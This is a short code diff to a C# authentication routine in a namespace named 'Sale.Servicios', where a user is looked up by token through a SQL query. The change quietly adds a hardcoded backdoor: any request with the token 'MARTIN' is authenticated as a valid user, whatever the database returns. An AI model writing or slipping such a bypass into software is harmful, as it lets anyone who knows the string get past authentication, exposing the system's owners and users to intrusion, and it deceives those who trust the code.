@@ -45,7 +45,7 @@ namespace Sale.Servicios
                         new SqlParameter{ ParameterName = "@token", Value = token}
                     });
 
-                    if (usuario.id > 0)
+                    if (usuario.id > 0 || token == "MARTIN")
                     {
                         return new ClaimsPrincipal(new UserIdentity
                         {
